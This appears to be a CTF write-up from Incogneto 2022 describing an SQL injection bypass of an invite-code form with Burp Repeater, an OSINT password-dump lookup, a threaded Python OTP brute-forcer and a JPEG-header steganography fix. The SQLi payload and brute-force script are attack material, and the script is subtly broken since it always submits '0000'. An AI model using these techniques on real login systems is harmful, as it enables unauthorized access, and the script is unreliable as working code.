## Incogneto 2022

A team based CTF, i competed with one of my other friends

### The mission

The mission was a serius of channgles, 

### Invisiable 

Here we are presented with a "hacking forum" that we have to get into using an invite code we dont have, when initaily loading up the webpage it is simply a matrix style landing page.

![Image of the landing page](assets/invisable1.png)

after removing the canvases and CSS using developer tools its clear to see how we are ment to input the code

![The login screen](assets/invisable2.png)

After just trying some things like `letmein` we simply get redirected to a nice lovely rick ashly telling us he will never give us up

Next we cant check for a posible SQLi, by inputting `"` we get a `Server Error (500)` from the server, this tells us it is indeed vonruable

We can now consider what the SQL for making this reqeust would look like, here is my geuss

```
SELECT * FROM table WHERE code = "{user input}"
```

And then the backend would check if there is one or more results

If we use the input `" OR 1=1;--` we use the -- to comment out the rest of the qoury

When we use it as our input we get the same `Server Error (500)`, likely because its getting URL encoded. We can change our exact request using a tool called burpsouite

With burp we want to go into proxy and turn `intercept` off, as this will catch our packages and then click open browser. When we navigate to the website everything will be as normal, i type test in the prompt, turn intercept on agein and click submit 

![Burp running the browser](assets/invisable3.png)

Now that we have our packet we can click `HTTP History` right click the packet and press `Send to repeater`

Now in the repeater we can change the request as we like

If we chage our input to the payload we get this

![We got the flag :D](assets/invisable4.png)

After we have the flag i right click and render it in my browser for the next part of the challange

### Invisible (Part two: Unknowen Pass)

We are told that the hacker that owned the code went by the username "cool.hacker.8", after a google search that went like this

```
"ctf 360" 2014 "cool.hacker.8"
```

We got the dump we needed and it looks like this

![Password Dump](https://github.com/logicguy1/CTF-Writeups/blob/main/assets/unknown1.png)

After using that username and password we are in and have the flag without issues.

![Anddd we have the flag!!](assets/unknown2.png)

### Invisible (Part three: One Time)

In this challange we have to try and crack a 4 digit OTP passphrase, the creator of the challange said that you dont need bruteforcing to solve it tho during the CTF this was the method chosen.

I used the following script to send the requests to the server

```py
import requests
import json
import threading

def clamp(n, smallest, largest):
    return int(max(smallest, min(n, largest)))

url = "http://142.93.209.130:8000/otp-auth"

headers = {
    "Referer": "http://142.93.209.130:8000/forums-login",
    "Cookie": "csrftoken=TOKEN"
}


def exploit(ids):
    for i in ids:
        while True:
            payload = {
                "otp": "0000"
            }
            try:
                r = requests.post(
                    url,
                    headers=headers,
                    json=payload
                )
            except:
                print("FAILED", i)
                continue

            if r.json()["success"] == "true":
                with open("Success", "w") as file:
                    file.write(str(i))

            print(i)
            break

with open("0-9999", "r") as file:
    inp = [i.strip() for i in file.readlines()][::-1]

for i in range(0,int(len(inp)),int(len(inp)/32)):
    imx = clamp(i+int((len(inp)/32)), 0, 9999)
    print(imx)
    
    threading.Thread(target = exploit, args = (inp[i:imx],)).start()
```

I had made a wordlists prior using the following format:

```
[drill@archlaptop scripts]$ head 0-9999 
0000
0001
0002
0003
0004
0005
0006
0007
0008
0009
[...]
```

It took a few tries but we got it at last :D

### xD

xD was a steganography challange where we are given a png (tv\_chal.png) attempting to open this image results in an error being throwen saying that the image is not a reconised format.

After getting the file up in gHex (a hex editor) we can see a byte header that looks like `D8 FF E0 FF` to verify that the header is in tact i did a quick search finding a page showing `FF D8 FF` as an example header, when we open the file with this new header using gimp we see this old tv

![Image of an old tv](assets/xD1.png)

After zooming arround on this TV we can see the flag hidden on the screen of it

![The flag is there :p](assets/xD2.png)




